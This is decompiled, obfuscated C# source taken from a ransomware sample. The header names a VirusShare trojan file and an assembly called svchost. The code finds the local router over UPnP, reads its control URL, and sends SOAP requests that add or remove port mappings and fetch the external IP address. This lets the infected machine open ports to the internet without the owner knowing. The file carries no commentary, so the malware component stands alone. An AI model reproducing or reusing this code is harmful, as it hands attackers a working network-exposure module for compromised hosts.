// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 422D1FBC-502B-4DB7-AC18-B994031CE62D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-7709a3ed96ddad83c1364a32bd84290b3d00212a09fc6619f0588d3725c06799.exe

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Xml;

public sealed class \u0005\u2003
{
  private static string \u0002;

  public static bool \u0002()
  {
    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
    socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.Broadcast, 1);
    socket.ReceiveTimeout = 3000;
    byte[] bytes = Encoding.ASCII.GetBytes(\u0008\u2003.\u0002(415301975));
    IPEndPoint remoteEP = new IPEndPoint(IPAddress.Broadcast, 1900);
    byte[] numArray = new byte[4096];
    try
    {
      socket.SendTo(bytes, (EndPoint) remoteEP);
      int count;
      do
      {
        count = socket.Receive(numArray);
        string lower = Encoding.ASCII.GetString(numArray, 0, count).ToLower();
        if (lower.Contains(\u0008\u2003.\u0002(415302336)))
        {
          string str = lower.Substring(lower.ToLower().IndexOf(\u0008\u2003.\u0002(415302358)) + 9);
          if (!string.IsNullOrEmpty(\u0005\u2003.\u0002 = \u0005\u2003.\u0002(str.Substring(0, str.IndexOf(\u0008\u2003.\u0002(415302310))).Trim())))
          {
            socket.Close();
            return true;
          }
        }
      }
      while (count > 0);
      socket.Close();
      return false;
    }
    catch
    {
      socket.Close();
      return false;
    }
  }

  private static string \u0002(string _param0)
  {
    XmlDocument xmlDocument = new XmlDocument();
    HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
    httpWebRequest.KeepAlive = false;
    using (WebResponse response = httpWebRequest.GetResponse())
    {
      using (Stream responseStream = response.GetResponseStream())
      {
        xmlDocument.Load(responseStream);
        XmlNamespaceManager nsmgr = new XmlNamespaceManager(xmlDocument.NameTable);
        nsmgr.AddNamespace(\u0008\u2003.\u0002(415302334), \u0008\u2003.\u0002(415302280));
        if (!xmlDocument.SelectSingleNode(\u0008\u2003.\u0002(415302254), nsmgr).Value.Contains(\u0008\u2003.\u0002(415302215)))
          return (string) null;
        XmlNode xmlNode = xmlDocument.SelectSingleNode(\u0008\u2003.\u0002(415302179), nsmgr);
        return xmlNode == null ? (string) null : new Uri(new Uri(_param0), xmlNode.Value).AbsoluteUri;
      }
    }
  }

  public static bool \u0002(int _param0, ProtocolType _param1, string _param2)
  {
    if (string.IsNullOrEmpty(\u0005\u2003.\u0002))
      throw new Exception(\u0008\u2003.\u0002(415302623));
    string str = string.Format(\u0008\u2003.\u0002(415302545), (object) _param0, (object) _param1.ToString().ToUpper(), (object) Dns.GetHostAddresses(Dns.GetHostName())[0], (object) _param2);
    return \u0005\u2003.\u0002(\u0005\u2003.\u0002, str, \u0008\u2003.\u0002(415302771)) != null;
  }

  public static bool \u0002(int _param0, ProtocolType _param1)
  {
    if (string.IsNullOrEmpty(\u0005\u2003.\u0002))
      throw new Exception(\u0008\u2003.\u0002(415302623));
    string str = string.Format(\u0008\u2003.\u0002(415302744), (object) _param0, (object) _param1.ToString().ToUpper());
    return \u0005\u2003.\u0002(\u0005\u2003.\u0002, str, \u0008\u2003.\u0002(415303062)) != null;
  }

  public static IPAddress \u0002()
  {
    XmlDocument xmlDocument = !string.IsNullOrEmpty(\u0005\u2003.\u0002) ? \u0005\u2003.\u0002(\u0005\u2003.\u0002, \u0008\u2003.\u0002(415303038), \u0008\u2003.\u0002(415303407)) : throw new Exception(\u0008\u2003.\u0002(415302623));
    XmlNamespaceManager nsmgr = new XmlNamespaceManager(xmlDocument.NameTable);
    nsmgr.AddNamespace(\u0008\u2003.\u0002(415302334), \u0008\u2003.\u0002(415302280));
    return IPAddress.Parse(xmlDocument.SelectSingleNode(\u0008\u2003.\u0002(415303370), nsmgr).Value);
  }

  private static XmlDocument \u0002(string _param0, string _param1, string _param2)
  {
    string s = \u0008\u2003.\u0002(415303342) + _param1 + \u0008\u2003.\u0002(415303182);
    HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
    httpWebRequest.KeepAlive = false;
    httpWebRequest.Method = \u0008\u2003.\u0002(415303659);
    byte[] bytes = Encoding.UTF8.GetBytes(s);
    httpWebRequest.Headers.Add(\u0008\u2003.\u0002(415303654), \u0008\u2003.\u0002(415303671) + _param2 + \u0008\u2003.\u0002(415307277));
    httpWebRequest.ContentType = \u0008\u2003.\u0002(415303614);
    httpWebRequest.ContentLength = (long) bytes.Length;
    httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
    XmlDocument xmlDocument = new XmlDocument();
    using (WebResponse response = httpWebRequest.GetResponse())
    {
      using (Stream responseStream = response.GetResponseStream())
      {
        xmlDocument.Load(responseStream);
        return xmlDocument;
      }
    }
  }
}
